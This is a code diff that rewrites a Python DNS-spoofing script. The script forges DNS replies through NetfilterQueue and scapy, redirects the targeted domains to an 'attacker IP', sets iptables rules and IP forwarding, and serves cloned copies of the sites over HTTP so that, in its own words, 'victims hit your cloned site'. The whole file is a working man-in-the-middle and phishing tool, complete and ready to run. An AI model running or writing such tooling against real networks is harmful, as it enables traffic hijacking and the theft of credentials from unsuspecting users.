@@ -1,74 +1,111 @@
 #!/usr/bin/env python3
-import socket
+"""
+DNS Spoofer: Intercepts DNS queries for specified domains and returns
+your HTTP server IP so victims hit your cloned site.
+Usage: sudo python3 dns_spoof.py domain1.com domain2.net ... [-q QUEUE]
+"""
+
+import os
+import threading
+import argparse
+from http.server import HTTPServer, SimpleHTTPRequestHandler
+from socketserver import ThreadingMixIn
 from netfilterqueue import NetfilterQueue
 from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send
 
-# === CONFIGURATION ===
-# The IP where your cloner is running
-FAKE_IP = "192.168.40.128"           # ← set this to your local host’s IP
-# Domains you want to spoof (must match TARGET_SITES in cloner.py)
-TARGET_DOMAINS = [
-    "testphp.vulnweb.com",
-    # add more here...
-]
+CLONE_DIR = "cloned_sites"
 
-QUEUE_NUM = 1                     # NetfilterQueue number
+class MultiDomainHandler(SimpleHTTPRequestHandler):
+    def translate_path(self, path):
+        host = self.headers.get('Host','').split(':')[0]
+        base = os.path.join(os.getcwd(), CLONE_DIR, host)
+        if os.path.isdir(base):
+            rel = os.path.normpath(path.lstrip('/').split('?',1)[0])
+            full = os.path.join(base, rel)
+            if os.path.isdir(full):
+                full = os.path.join(full, 'index.html')
+            return full
+        # fallback to default behaviour
+        return super().translate_path(path)
 
-# === PACKET PROCESSING ===
-def process_packet(packet):
-    scapy_pkt = IP(packet.get_payload())
+class ThreadedHTTP(ThreadingMixIn, HTTPServer):
+    daemon_threads = True
 
-    # Only handle DNS queries
-    if scapy_pkt.haslayer(DNSQR):
-        qname = scapy_pkt[DNSQR].qname.decode().rstrip('.')
-        if qname in TARGET_DOMAINS:
-            print(f"[+] Spoofing DNS response for {qname}")
+def start_http(port: int, domains: list):
+    server = ThreadedHTTP(('', port), MultiDomainHandler)
+    print(f"[+] HTTP server on port {port} serving: {', '.join(domains)}")
+    server.serve_forever()
 
-            # Build a new DNS response packet
-            spoofed = IP(
-                src=scapy_pkt.dst,
-                dst=scapy_pkt.src
-            ) / UDP(
-                sport=53,
-                dport=scapy_pkt[UDP].sport
-            ) / DNS(
-                id=scapy_pkt[DNS].id,     # keep same transaction ID
-                qr=1,                      # this is a response
-                aa=1,                      # authoritative
-                qd=scapy_pkt[DNS].qd,      # original question
-                an=DNSRR(
-                    rrname=scapy_pkt[DNS].qd.qname,
-                    ttl=300,
-                    rdata=FAKE_IP
+def process_packet(pkt, spoof_map):
+    sc = IP(pkt.get_payload())
+    if sc.haslayer(DNSQR):
+        qn = sc[DNSQR].qname
+        if qn in spoof_map:
+            dom = qn.decode().strip('.')
+            print(f"[+] Spoofing DNS for {dom}")
+            reply = (
+                IP(src=sc.dst, dst=sc.src) /
+                UDP(sport=53, dport=sc[UDP].sport) /
+                DNS(
+                    id=sc[DNS].id,
+                    qr=1, aa=1,
+                    qd=sc[DNS].qd,
+                    an=DNSRR(rrname=qn, ttl=300,
+                              rdata=spoof_map[qn])
                 )
             )
-
-            send(spoofed, verbose=False)
-            packet.drop()  # drop the original query
+            send(reply, verbose=False)
+            pkt.drop()
             return
-
-    # all other packets just go through
-    packet.accept()
-
+    pkt.accept()
 
 def main():
-    # Make sure you’ve run these iptables rules (adjust iface if needed):
-    #    iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 1
-    #    iptables -I OUTPUT  -p udp --dport 53 -j NFQUEUE --queue-num 1
-    #    iptables -I INPUT   -p udp --sport 53 -j NFQUEUE --queue-num 1
-    #
-    # Then run this script as root:
-    #    python3 dnsspoof.py
+    parser = argparse.ArgumentParser(
+        description="DNS Spoofer - specify domains to hijack DNS queries for"
+    )
+    parser.add_argument(
+        'domains',
+        nargs='+',
+        help='Domain(s) to spoof, e.g. example.com vulnweb.com'
+    )
+    parser.add_argument(
+        '-q', '--queue',
+        type=int,
+        default=1,
+        help='NetfilterQueue number (default: 1)'
+    )
+    args = parser.parse_args()
 
+    # Prompt attacker IP at runtime
+    attacker_ip = input("Enter your HTTP server IP (attacker IP): ").strip()
+    if not attacker_ip:
+        print("[!] Attacker IP is required.")
+        return
+
+    # Build mapping of b"domain." → attacker_ip
+    spoof_map = { dom.encode() + b'.': attacker_ip for dom in args.domains }
+
+    # Enable IP forwarding and hook DNS to NFQUEUE
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    os.system(f"iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num {args.queue}")
+    os.system(f"iptables -t nat -I PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num {args.queue}")
+
+    # Launch HTTP server (to serve cloned sites) on port 80
+    threading.Thread(
+        target=start_http,
+        args=(80, args.domains),
+        daemon=True
+    ).start()
+
+    # Bind NFQUEUE and start processing
     nfq = NetfilterQueue()
-    nfq.bind(QUEUE_NUM, process_packet)
-    print(f"[*] Waiting for DNS queries (queue {QUEUE_NUM})...")
+    nfq.bind(args.queue, lambda pkt: process_packet(pkt, spoof_map))
+    print(f"[*] Waiting for DNS queries (queue {args.queue})…")
     try:
         nfq.run()
     except KeyboardInterrupt:
-        print("\n[*] Flushing queue and exiting.")
+        print("\n[*] Cleaning up and exiting.")
         nfq.unbind()
-
 
 if __name__ == "__main__":
     main()
